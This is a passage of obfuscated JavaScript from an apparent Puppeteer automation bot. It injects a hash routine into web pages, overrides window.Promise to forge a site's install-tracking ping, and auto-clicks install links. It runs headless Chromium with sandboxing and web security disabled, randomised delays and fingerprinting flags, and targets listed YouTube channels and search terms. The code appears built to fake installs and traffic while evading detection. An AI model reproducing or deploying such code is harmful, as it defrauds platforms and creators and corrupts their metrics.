0x1 + -0x122 | L >> -0x76d * -0x2 + -0x51c + -0x4dc * 0x2 & 0x1 * 0x20e7 + 0x7bd + -0x3 * 0xd77) << y[0x18 * 0xc4 + -0x1 * -0xa6a + -0x1cc7 & N++], P[N >> 0xb0 * -0xf + 0x9 * 0x322 + -0x11e0] |= (0xa5f + -0x380 + -0x65f | -0x4f * -0x4a + 0x11d4 + -0x3 * 0xd79 & L) << y[-0x13d * -0x6 + 0x247d + 0xafa * -0x4 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x270d * 0x1 + -0x9 * 0xbe + 0x2dfb ? (this['block'] = P[0x26cd + -0x252b * 0x1 + -0x192], this['start'] = N - (-0xb9 * 0x19 + -0x7 * -0x21b + 0x1ca * 0x2), this['hash'](), this['hashed'] = -0x16a0 + 0x443 * -0x8 + -0x1 * -0x38b9) : this['start'] = N;
                }
                return this['bytes'] > -0x19afd2507 + 0x547c7eec + -0x24680a61a * -0x1 && (this['hBytes'] += this['bytes'] / (0xcebe090c + 0x1 * -0x5c967604 + 0x13 * 0x7772e28) << 0x744 * -0x1 + 0x13ca + -0xc86, this['bytes'] = this['bytes'] % (0xb53760e8 + -0x5640a278 + 0xa1094190)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * 0x1b73 + 0x33 * 0xb3 + -0x1 * 0x835;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x79f * -0x1 + 0x3ad * -0x1 + -0x2 * -0x5ae] = this['block'], J[K >> -0x18ba + -0x868 * -0x2 + -0x1a * -0x4e] |= x[0xfec + 0x20ef * -0x1 + -0x2 * -0x883 & K], this['block'] = J[0xadc + -0xced * 0x3 + -0x179 * -0x13], K >= 0x1fba + 0x1 * 0x2419 + -0x1 * 0x439b && (this['hashed'] || this['hash'](), J[-0x7bc + -0xc26 * 0x1 + 0x13e2] = this['block'], J[0xc96 + 0x1 * 0x12cc + -0x1f52] = J[0x69f * -0x2 + 0x11 * 0x1ab + -0xf1c] = J[-0x1 * 0x14a1 + -0x9f5 + 0x1e98] = J[0x1bb5 + -0x587 + 0x1 * -0x162b] = J[-0x2073 + -0x1663 + 0x7 * 0x7d6] = J[-0x2216 + -0x246 + 0x2461] = J[0x267 * 0x5 + -0x161 + -0xa9c] = J[-0x1e57 + -0x8b9 + 0x2717 * 0x1] = J[0xcbc + 0xf32 + 0x1 * -0x1be6] = J[0x1d19 + 0x1 * -0x1de4 + 0xd4] = J[0x670 * -0x2 + 0x2643 + -0x1959] = J[0x460 * 0x8 + 0x2602 + 0x1 * -0x48f7] = J[-0x18d9 + 0x39b * 0x3 + -0x22 * -0x6a] = J[-0x1 * -0x21f0 + -0x5f1 + -0x2 * 0xdf9] = J[0x1135 + 0x7 * 0x265 + -0x5a7 * 0x6] = J[-0x3c2 + 0x2501 + -0x2130] = -0x26e + 0x2 * 0xb9d + -0xf2 * 0x16), J[-0x23d8 + 0x675 + 0x1d71] = this['hBytes'] << -0x1 * -0x46c + 0x1f49 + 0x6 * -0x5f3 | this['bytes'] >>> -0x782 + 0x56b * -0x1 + 0x2 * 0x685, J[-0x2600 + 0x6fd + 0x1f12 * 0x1] = this['bytes'] << 0x1e6d + -0xf4a + -0xf20, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x190c + 0xc7d * -0x2 + 0x3216; J < -0x1d97 + 0x393 + 0x1a54; ++J)
                K = Q[J - (0x9a6 + -0x1 * 0x241b + 0xf2 * 0x1c)] ^ Q[J - (-0x1bf2 + -0x26c2 + -0x1 * -0x42bc)] ^ Q[J - (-0x1 * 0x1c67 + -0x1626 + 0x5 * 0xa1f)] ^ Q[J - (-0x4 * -0xef + 0x940 * -0x4 + 0x2154)], Q[J] = K << 0x1a2 + -0x20c9 + 0x1f28 | K >>> 0x1 * 0x12e1 + 0x1181 + -0x1 * 0x2443;
              for (J = -0xe1a + 0x4ed + 0x92d; J < -0xf21 + -0x295 * 0x7 + 0x2148; J += 0xc62 + 0x134a * -0x1 + -0x6ed * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x773 + 0x9a3 * 0x2 + 0x1 * -0x1ab4 | L >>> -0x471 * -0x4 + -0x1497 + 0x2ee) + (M & N | ~M & O) + P + (-0x7ffb1d7d * -0x1 + 0x9a994617 + -0x3 * 0x4005f8a9) + Q[J] << 0x2171 + -0x665 * 0x4 + -0x3d * 0x21) << -0x732 + 0x1327 * 0x1 + -0xbf0 | P >>> 0xa03 * -0x1 + 0x26b2 + -0x1c94) + (L & (M = M << -0xaa + 0x1282 + 0x2 * -0x8dd | M >>> -0x11 * -0x4f + -0xcb * -0x21 + -0x1f68) | ~L & N) + O + (-0x2 * -0xbd001de + 0xc * 0xd755aaf + -0x5e9dca57) + Q[J + (-0xa11 + 0x4 * -0x2df + 0x158e * 0x1)] << -0x2 * -0x4ee + 0x295 * -0x2 + -0x1 * 0x4b2) << 0x4ed + -0x4 * 0x51 + -0x3a4 | O >>> 0x16 * 0x1a5 + -0x9a9 * -0x4 + -0x1 * 0x4ab7) + (P & (L = L << -0x98f * 0x2 + 0x1c7d + -0x941 | L >>> -0x6c1 + -0x2a2 * -0x4 + 0xc1 * -0x5) | ~P & M) + N + (0x350bb6c * 0x2e + 0x515 * 0x97336 + 0x1 * -0x6e05b53d) + Q[J + (0x4ae + 0xe96 + -0x1342)] << 0x91e + -0x11 * -0x4f + -0xe5d) << 0x17 * 0x55 + -0x135 + 0x223 * -0x3 | N >>> -0x3a5 + 0x2224 + 0x4 * -0x799) + (O & (P = P << 0x21f1 + 0xcad + -0x2e80 | P >>> 0x49 * 0x2 + -0x1f * -0xb5 + 0x47f * -0x5) | ~O & L) + M + (-0x79839d6d + 0x2c77 * 0x9409 + 0xba4fbad7) + Q[J + (0x7 * 0x4d + -0x14d0 + 0x4ae * 0x4)] << 0x8d * -0x3 + 0x1 * -0x1e5f + 0x2 * 0x1003) << -0x2282 + 0x3 * 0xac1 + 0x244 | M >>> -0xd94 + -0x1807 * 0x1 + -0x3 * -0xc92) + (N & (O = O << -0x1158 + 0x16a9 * 0x1 + -0x533 | O >>> -0x793 + -0x119 * 0x17 + 0x1 * 0x20d4) | ~N & P) + L + (0x2 * 0x46e97853 + 0x1 * 0x349a5107 + -0x67eac814) + Q[J + (0x5 * -0xf1 + 0x1925 + -0x146c)] << -0x1 * 0x4c1 + 0x511 * -0x1 + 0x9d2, N = N << -0x1b98 * -0x1 + -0xb * 0x2 + 0x6d9 * -0x4 | N >>> -0xd1d + 0x1 * -0x2281 + 0x2fa0;
              for (; J < -0x41 * -0x30 + 0x20b2 + -0x8f2 * 0x5; J += -0x2 * -0x109c + -0x19c0 + -0x773)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x22d1 + 0x20f0 + -0x55 * 0xcc | L >>> 0x1621 + 0x23e6 + 0x2a2 * -0x16) + (M ^ N ^ O) + P + (0xa7 * 0xb0c581 + 0x76 * 0x11c335 + -0x14e34 * 0x9b1) + Q[J] << -0xbbd * -0x3 + -0x2d * 0x39 + -0x1932) << 0x61 * 0x3a + -0x17e9 * -0x1 + -0x6 * 0x7a5 | P >>> 0x1913 + -0x258d + 0xc95) + (L ^ (M = M << 0x15de + 0x86a * -0x1 + -0xd56 | M >>> -0x1 * -0xf77 + -0x9a * 0x23 + 0x1 * 0x599) ^ N) + O + (0x8224fecf + -0x22 * -0x30e045c + -0x24885a * 0x35f) + Q[J + (-0x65 * 0x5d + 0xf49 + 0x9 * 0x261)] << -0x2491 + -0xa29 + 0x2eba) << 0x162f + 0x99f * -0x1 + 0x1 * -0xc8b | O >>> 0x18a * -0x1 + 0x62f + -0x7 * 0xa6) + (P ^ (L = L << 0x191c + 0x1d57 + 0x7c3 * -0x7 | L >>> 0x1 * 0x19f1 + 0xcc2 + -0x7 * 0x587) ^ M) + N + (-0x4761d86c + 0x1 * 0x226caefd + 0x93cf1510) + Q[J + (0x5b5 * 0x1 + 0xb * 0x33f + -0x2968)] << 0x1 * 0x16c6 + -0x4d4 + -0x11f2) << -0x1 * 0x1fc7 + -0x108e + 0x305a | N >>> -0xe * 0xd9 + -0x12 * 0x1cd + 0x2c63) + (O ^ (P = P << 0x6b + -0x437 * 0x3 + -0x316 * -0x4 | P >>> 0x11ff + -0xa6 * -0xd + -0x1a6b) ^ L) + M + (0x6c3104 * -0x1df + 0xd20994f + 0x1e9 * 0x9d239e) + Q[J + (-0x4bf * -0x2 + 0x1 * 0x1eef + -0x286a)] << -0x163c * 0x1 + -0x13b1 + 0x29ed * 0x1) << 0x2 * -0x2c5 + -0x1b3 + -0x3a1 * -0x2 | M >>> 0x73a + -0xd72 + 0x1 * 0x653) + (N ^ (O = O << 0xd * 0x2b4 + 0xac5 * 0x2 + -0x3890 | O >>> 0x20ba + -0xf * -0x299 + -0x9 * 0x7f7) ^ P) + L + (-0x668eaa58 + -0x6c3154e4 + 0x15e17 * 0xeb2b) + Q[J + (0x3ff + 0x1 * -0x180d + 0x1412)] << 0xaa3 * -0x3 + -0x21ca + -0x8b * -0x79, N = N << -0x34 * -0x9 + 0x1 * -0xe7c + -0xf * -0xda | N >>> -0x1c08 + 0x1c38 + -0x17 * 0x2;
              for (; J < 0x25ac + 0x4b2 + -0x2a22; J += 0x1cd6 + 0x2432 + -0x4103)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x268f + 0x137 + 0x255d | L >>> -0xd31 + 0x769 + 0x5e3) + (M & N | M & O | N & O) + P - (-0xa9f7d509 + -0x1 * -0x6dc1297c + -0xad1aeeb1 * -0x1) + Q[J] << -0x2366 + -0x3 * 0x45c + -0x9b2 * -0x5) << -0x19cd + -0x1e8 + 0x1bba | P >>> 0xa * -0xcb + 0x1 * 0x189b + -0x1092) + (L & (M = M << -0x1a23 * 0x1 + -0xb * -0x319 + -0xd * 0x9a | M >>> 0xdb2 + -0x2 * 0x88 + -0xca0) | L & N | M & N) + O - (0x48342ba + 0x2b30dc3 * 0x49 + -0x58adec31) + Q[J + (-0x17a3 + -0xc1 * -0x25 + -0xb * 0x63)] << -0x2672 + 0xace + 0x1ba4) << -0x23e6 + 0xaa0 + 0xb9 * 0x23 | O >>> -0x26f * -0x9 + 0x27 * 0xe5 + 0x15 * -0x2b3) + (P & (L = L << 0x1 * 0x1f0c + 0x88a + -0x2778 | L >>> -0x2bd + -0x1575 * -0x1 + -0x3be * 0x5) | P & M | L & M) + N - (0x208c69 * 0x38b + -0x21a5e98a * 0x6 + 0xc776445d) + Q[J + (0x9df * -0x2 + 0x8f1 + 0xacf * 0x1)] << -0x7a * 0x14 + -0x1d * 0x157 + 0x3063) << -0x3 * 0xa47 + 0x9 * -0x1d + 0x1fdf | N >>> 0x21df + 0x21de + -0x43a2) + (O & (P = P << 0x74 * 0x43 + 0x26 * -0x2b + -0x17dc | P >>> 0x1b34 + -0x576 + 0x4 * -0x56f) | O & L | P & L) + M - (-0x1 * -0x9839c043 + 0xace54179 + -0x1794bfd8 * 0x9) + Q[J + (0x36b + -0x11 * 0x2d + -0x1 * 0x6b)] << -0x226a * 0x1 + -0x4 * 0x25c + -0x15ed * -0x2) << 0x21 * -0xae + 0x7 * -0x482 + -0x23 * -0x18b | M >>> -0xa72 * -0x1 + -0x24af * 0x1 + -0x18 * -0x119) + (N & (O = O << 0x1 * 0xb7 + -0x1658 + -0x15bf * -0x1 | O >>> -0x443 + -0x1c34 + -0x1 * -0x2079) | N & P | O & P) + L - (-0x7820aa1e * 0x1 + 0xf * -0x42508e1 + -0x5 * -0x3b09b07d) + Q[J + (0x8e4 + 0x1fe1 * -0x1 + 0x27 * 0x97)] << -0x3 * 0xbe3 + -0x10c6 + -0x1b1 * -0x1f, N = N << 0x24b9 + 0x20cf + 0x1 * -0x456a | N >>> -0x3 * -0x423 + 0x1ab + -0xe12;
              for (; J < -0x1933 + -0xc25 * -0x2 + 0x139 * 0x1; J += -0x2473 + -0x2 * 0x8ad + -0xa6 * -0x53)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1bac + 0x3ef * 0x6 + -0x3341 | L >>> 0x254b + -0x8f * 0x13 + -0x1a93) + (M ^ N ^ O) + P - (-0x455404c8 + -0x106874e3 * -0x1 + 0x16063 * 0x4d65) + Q[J] << -0x20df + 0x23 * 0x10d + -0x3e8) << 0x876 + -0xb0d + 0x14e * 0x2 | P >>> -0x37 * 0x61 + -0xd2d * 0x2 + 0x2f4c) + (L ^ (M = M << 0x68e + -0x192e + -0x2 * -0x95f | M >>> -0x7d2 + -0x17b9 + 0x1f8d * 0x1) ^ N) + O - (0x57b6912f + 0x5dd81 * 0xce1 + -0x6da30d66) + Q[J + (0x1 * -0x1c96 + -0x22e3 + 0x3f7a)] << 0x20e3 * 0x1 + -0x1 * 0xe6b + -0x4 * 0x49e) << 0x1d * 0x1d + -0x1609 * -0x1 + -0x194d | O >>> -0x800 + 0x2710 + -0x1ef5) + (P ^ (L = L << 0x3b2 + -0x1bd3 + 0x3 * 0x815 | L >>> -0x766 + 0x10 * -0x233 + -0x74 * -0x5e) ^ M) + N - (-0xa5 * 0x7f131f + -0x12a0f74d + 0x9a258872 * 0x1) + Q[J + (0x1 * -0x1c4f + -0x56 * 0x15 + 0x235f)] << -0x6 * -0x646 + 0x1deb + 0x1 * -0x438f) << -0x22fc + 0xbc9 + 0x4 * 0x5ce | N >>> -0x7 * 0x305 + -0x115b + -0x29 * -0xf1) + (O ^ (P = P << 0x20ff + 0x2555 + 0x1a2 * -0x2b | P >>> -0x1f * -0x53 + 0x1111 + -0x1b1c) ^ L) + M - (-0x3c2f8846 + -0x2320ae37 + 0x94ed74a7) + Q[J + (-0xa7a + -0x1f1d * -0x1 + -0x14a0)] << 0xbcb * 0x1 + 0x8af * 0x1 + -0x147a) << -0xf7d + 0x1 * 0xeae + 0xd4 | M >>> 0x176b + -0x1 * -0x169f + 0xb * -0x42d) + (N ^ (O = O << -0x20dc + -0x2 * 0x13a + 0x236e | O >>> -0xd21 + 0x256e + -0x184b) ^ P) + L - (-0x60b05644 + 0x4a2 * -0x1442bf + 0xf42acd4c) + Q[J + (-0xcb * 0xe + 0xa82 * -0x2 + 0x2022)] << -0x12f * -0xf + -0xbf * 0x1b + 0x264, N = N << -0xe66 + 0x789 + 0x1 * 0x6fb | N >>> -0x222d + 0x1d92 + -0x49d * -0x1;
              this['h0'] = this['h0'] + L << 0x4 * 0x173 + -0x1b0b + 0x153f, this['h1'] = this['h1'] + M << 0x1dee + 0x18f7 + 0x263 * -0x17, this['h2'] = this['h2'] + N << 0xb4c * -0x3 + -0x1832 + 0x3a16, this['h3'] = this['h3'] + O << -0x164f + 0x13ba + 0x295, this['h4'] = this['h4'] + P << -0xafb + 0x9 * 0x2a1 + -0xcae;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x629 * 0x4 + -0x1ae3 * 0x1 + 0x33a3 & 0xf * 0x169 + 0x3dc + 0x1 * -0x18f4] + w[J >> 0x43 * 0x94 + 0x2 * 0x1049 + -0x4736 & -0x1 * -0x19b6 + -0x7 * -0x2c5 + 0x1 * -0x2d0a] + w[J >> 0x1d4d + 0x1aa1 * 0x1 + -0x37da & 0x11 * -0x146 + 0x1 * -0x1f5a + 0x350f] + w[J >> 0x106d + 0x1056 + -0x20b3 & -0x266e + 0xe01 + -0xc3e * -0x2] + w[J >> -0xb * 0x371 + -0x1 * -0x4d2 + -0x3ad * -0x9 & -0x1bd5 + 0x16 * -0x5a + 0xf * 0x260] + w[J >> -0x1c75 + -0x19d1 + 0x364e & -0x4 * 0x6f3 + 0x864 + 0x1377] + w[J >> -0x8a8 + 0x1234 * 0x1 + -0x988 & -0x1e06 + -0x2a9 + -0x1 * -0x20be] + w[-0xf86 + -0x19df + -0x1 * -0x2974 & J] + w[K >> 0x21a2 + -0x1b * 0xe3 + 0xb * -0xdf & 0x1b * 0x121 + -0x1d5c + 0x22 * -0x8] + w[K >> -0xed * 0x1e + -0x1334 + 0x5 * 0x96a & -0xec5 + -0x2438 + -0x36 * -0xf2] + w[K >> 0x1 * 0x8b7 + -0xb * -0x103 + 0x1cc * -0xb & 0x13a2 + -0x2f8 + 0x3 * -0x589] + w[K >> -0xcda * -0x1 + -0xd56 * 0x1 + -0x14 * -0x7 & -0x19f9 + -0x3 + 0x1a0b] + w[K >> -0x2 * -0xbff + 0x15 * -0x175 + 0xd * 0x83 & -0x65c * -0x6 + 0x3b3 + -0x29cc] + w[K >> 0x327 + -0x29 * -0x1f + -0x816 & 0xc * 0xac + 0x1b55 + -0x2356 * 0x1] + w[K >> 0x142e + 0x1051 + -0x247b & -0x1946 + -0x1957 + -0x3 * -0x10e4] + w[-0x1 * -0x3b + -0x8dc + 0x8b0 & K] + w[L >> 0x1552 + 0xaa * -0xa + -0xa * 0x175 & 0x15e + -0x547 + 0x3f8] + w[L >> -0x13a * 0x17 + -0x245a + -0x815 * -0x8 & 0x1ece + -0x17c7 + -0x6f8] + w[L >> -0x1 * -0xa55 + -0xa6 + -0x99b & 0x11fc + 0x76c + 0x39f * -0x7] + w[L >> -0x1ea + -0xbbc + 0xdb6 & 0x2 * 0x1c1 + 0x1f3 * 0x10 + -0x22a3 * 0x1] + w[L >> -0x1 * 0x179 + -0x5d * 0x8 + 0x46d & -0x21d9 + 0x643 * 0x5 + -0x13 * -0x23] + w[L >> 0x55 * 0x23 + 0xd5f + -0x6 * 0x429 & 0x1 * 0xe87 + -0x1 * -0x905 + -0x177d] + w[L >> -0x10 * 0xbc + -0x7aa + 0x136e & -0x16f0 + 0x1 * -0xd4d + -0x1 * -0x244c] + w[-0x16ac + 0xb93 + -0x22 * -0x54 & L] + w[M >> 0x1ae2 + -0x1 * 0x2269 + 0x7a3 & 0x6c7 + -0x13d4 + 0x1 * 0xd1c] + w[M >> 0x115 * -0x21 + 0x4db + 0x1ef2 & -0x1bbc + 0x44b + -0x10 * -0x178] + w[M >> -0x975 + 0xb * -0x24f + 0x107 * 0x22 & -0x1295 * -0x1 + -0x1 * 0x10a9 + -0x1dd] + w[M >> 0xaa7 + -0x47 * 0x7 + -0x8a6 & 0xef8 + -0xa * -0x19a + -0x57 * 0x5b] + w[M >> -0xbfc + -0x1730 + 0x62 * 0x5c & -0x138b * 0x1 + -0x1 * 0xc27 + -0x2e3 * -0xb] + w[M >> -0x1 * -0x184 + 0x1 * -0xc0f + 0xa93 & -0x2361 + -0x1eba + 0x422a] + w[M >> -0x9 * 0x5f + 0x1 * 0x53d + -0x1 * 0x1e2 & -0x2 * 0x87b + 0x1 * 0x397 + 0xd6e] + w[0x17 * 0x68 + 0x28 * 0xd + 0xb51 * -0x1 & M] + w[N >> -0x1537 + -0x517 + -0x2e * -0x93 & 0x4c5 * -0x4 + -0xbc8 + -0x1eeb * -0x1] + w[N >> 0x8 * 0x361 + 0x1873 * 0x1 + -0x3363 & 0x1 * -0x22bd + 0x1 * -0x191 + -0x6b * -0x57] + w[N >> -0x146 * 0x1 + 0x169 * -0xa + 0xf74 & 0x1def * -0x1 + 0x2 * 0x4c + 0x1d66] + w[N >> 0xb + -0x3 * -0xa85 + 0x2de * -0xb & -0xd69 * 0x2 + 0x2 * 0x285 + 0x15d7] + w[N >> 0x1b4 + -0x2b9 + -0x3 * -0x5b & -0x275 + 0x3de + -0x15a] + w[N >> -0x31a + -0x2228 + -0x6f * -0x56 & -0x1a1 + -0x46e * -0x7 + -0x1d52] + w[N >> 0x25c2 + 0x11 * 0x12a + -0x3988 * 0x1 & -0x454 * -0x1 + 0x635 * 0x3 + -0x16e4] + w[0x1083 + 0x971 * 0x1 + 0x3b3 * -0x7 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * -0x25f1 + 0xd * 0x166 + -0x3807 & 0xfd7 * -0x1 + -0xd * -0x23b + -0xc29,
                J >> -0x10d9 + 0x34 * 0x6d + -0x53b & 0x2514 + -0x218b + -0x1 * 0x28a,
                J >> 0x1d12 + 0x8f + 0x1 * -0x1d99 & -0x6a1 + 0x2 * 0x601 + 0x22 * -0x21,
                0x10f * 0x2 + 0x1c2a + -0x93 * 0x33 & J,
                K >> -0x21f5 + 0x143 * 0x1a + 0x13f & -0x10e3 + 0x25f0 + 0x12e * -0x11,
                K >> -0x3b * 0xd + 0xe77 * 0x2 + -0x19df & -0x64e + 0x1894 + 0x1147 * -0x1,
                K >> 0x4ff + 0x586 + -0x3 * 0x37f & -0xefd + -0x8ee + 0x18ea,
                -0x7 * -0x35f + 0xbda + 0x372 * -0xa & K,
                L >> 0x1 * 0x1f18 + 0x2 * -0x83 + -0x2 * 0xefd & -0x86 * -0x4 + 0x1302 + -0x141b,
                L >> -0xb44 + -0x238e + 0x1771 * 0x2 & -0x2 * -0x581 + 0x1 * 0x41c + -0xe1f,
                L >> -0x17cc + -0xd * -0x45 + 0x2b * 0x79 & 0x35 * 0x4f + 0xf6f * -0x1 + 0x13,
                -0x48 * -0x33 + -0x12ac + 0x553 * 0x1 & L,
                M >> 0x2 * -0x2cd + 0x18a3 + 0x175 * -0xd & 0x828 * -0x2 + 0x26e2 + -0x1593,
                M >> -0x127a + -0x1425 + 0x26af & 0x75a * 0x4 + 0xa8c + -0x1 * 0x26f5,
                M >> 0x977 + 0x700 + -0x106f & 0x2581 * 0x1 + -0x1b7f + -0x903,
                0xd40 + 0x180d * -0x1 + 0x2 * 0x5e6 & M,
                N >> 0x132 * -0x11 + -0x22c2 + 0x372c & -0x17aa + 0x2625 + 0xd7c * -0x1,
                N >> -0x9d6 + -0x33b + 0xd21 & -0x16be + -0x11d2 * -0x1 + 0x1f9 * 0x3,
                N >> 0x114 * -0x8 + 0x1c1d + -0x1375 & 0x2 * -0x518 + 0x3 * -0x968 + 0x2767,
                -0x12c + -0x275 + 0x4a0 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x43 * -0x4 + -0x16f0 + 0x15f8), (K = new DataView(J))['setUint32'](0x7f6 * -0x1 + -0xe37 + -0x1 * -0x162d, this['h0']), K['setUint32'](-0x79c + -0x151f + 0x1cbf, this['h1']), K['setUint32'](-0x1eb8 * -0x1 + 0x5c5 * -0x1 + -0x18eb, this['h2']), K['setUint32'](0x488 + 0xa46 + 0x2 * -0x761, this['h3']), K['setUint32'](-0x55b + 0xc9b + -0x730, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xc5e + 0xb88 + 0xa1 * -0x26];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x101 * -0x9 + 0x20c0 + -0x17b7;
            J[-0x7 * -0x480 + -0x1d6a + -0x216]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x13c0 + 0x2048 + 0x6 * -0x8ac] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2 * 0x312 + -0x248a + 0x1e67 * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1b10 + -0x149 * 0x1 + -0x13 * -0x17e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xcc5 * -0x1 + -0x10d6 + 0x2377), Promise['resolve'](-0x24e9 + -0x56f * 0x1 + 0x2a59);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * -0x265f + -0x947 + -0x1d18; j < 0x69 * -0x39 + 0x94 * 0x31 + -0x4f2; j++)
    i();
}
const NETWORK_PATIENCE = -0x59 * -0x5c + 0x1d7d + 0x1e39 * -0x1 + (-0x84d + 0x40 * 0x19 + 0x1 * 0xdc5) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1577 + -0x21a8 + -0xb * -0x11c) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + W(0x7, 'i!Gg') + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1937 + -0x11e6 + -0x751);
    let h = e[f];
    return h;
  }, d(b, c);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1ff * -0xb + -0x1 * 0x20ab + 0xab6; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 